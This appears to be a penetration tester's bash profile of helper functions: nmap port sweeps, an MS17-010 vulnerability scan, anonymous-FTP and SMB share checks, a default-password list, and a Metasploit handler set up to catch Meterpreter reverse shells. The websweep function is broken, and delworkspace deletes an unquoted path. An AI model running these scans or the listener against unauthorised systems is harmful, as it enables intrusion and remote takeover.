desktop()
{
cd /root/Desktop
}

apache()
{
cd /var/www/html
}

wordlist()
{
cd /usr/share/wordlists
}

workspace(){
cd /root/Desktop; mkdir $1; cd $1; mkdir scans; mkdir screenshots; xfce4-terminal --title="$1";
echo "admin" > deffpass.txt
echo "root" >> deffpass.txt
echo "$1" >> deffpass.txt
}

delworkspace()
{
cd /root/Desktop; rm -rf /root/Desktop/$1; echo "Workspace $1 has been deleted";
}

tools()
{
cd /opt/tools;
}

nmapst()
{ 
nmap -T4 -v --open -n $1 -sV
}

networkr()
{
nmcli networking off
nmcli networking on
}

smbsweep()
{
nmap -T4 -p139,445 --open -n -oG smbsweep.txt $1
cat smbsweep.txt | cut -d " " -f2 | sort -u | grep -v "Nmap" > smb_ips.txt
}

msfstart()
{
touch meter.rc;
echo "setg SMBDOMAIN $1" > meter.rc
echo "setg SMBUSER $2" >> meter.rc
echo "setg SMBPASS $3" >> meter.rc
echo "use exploit/multi/handler" >> meter.rc
echo "set payload windows/meterpreter/reverse_tcp" >> meter.rc
echo "set LHOST eth0" >> meter.rc
echo "set LPORT 4444" >> meter.rc
echo "set ExitOnSession false" >> meter.rc
echo "exploit -j -z" >> meter.rc
service postgresql start
msfdb reinit
msfconsole -r meter.rc
rm meter.rc
}

mssqlsweep()
{
nmap -T4 -p1433 --open -n -oG mssqlsweep.txt $1
cat mssqlsweep.txt | cut -d " " -f2 | sort -u | grep -v "Nmap" > mssql_ips.txt
}

ftpsweep()
{
nmap -T4 -p21 --open -n -oG ftpsweep.txt $1
cat ftpsweep.txt | cut -d " " -f2 | sort -u | grep -v "Nmap" > ftp_ips.txt
}

telnetsweep()
{
nmap -T4 -p23 --open -n -oG telnetsweep.txt $1
cat telnetsweep.txt | cut -d " " -f2 | sort -u | grep -v "Nmap" > telnet_ips.txt
}

websweep()
{
nmap -T4 -p80,81,443,8080 --open -n -oG websweep.txt $1
cat websweep.txt | cut -d " " -f2 && sort -u && grep -v "Nmap" > web_ips.txt
}

finddc()
{
nmap -T4 -p3268,3269 --open $1 -n
}

ms17sweep()
{
nmap -T4 --script=smb-vuln-ms17-010 -iL smb_ips.txt -n -p445,139 > ms17_vulns.txt
}

anonsweep()
{
nmap -T4 --script=ftp-anon -iL ftp_ips.txt -n -p21 > anon_logins.txt

}

connectshare()
{
if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ] || [ -z "$4" ]
then
echo "connectshare HOST SHARENAME USERNAME WORKGROUP"
else 
smbclient \\\\$1\\$2 -U="$3"  --workgroup="$4"
fi
}

listshares()
{
if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ] || [ -z "$4" ]
then
echo "listshares HOST USERNAME PASSWORD WORKGROUP";
else 
smbmap -u $2 -p $3 -d $4 -H $1
fi
}
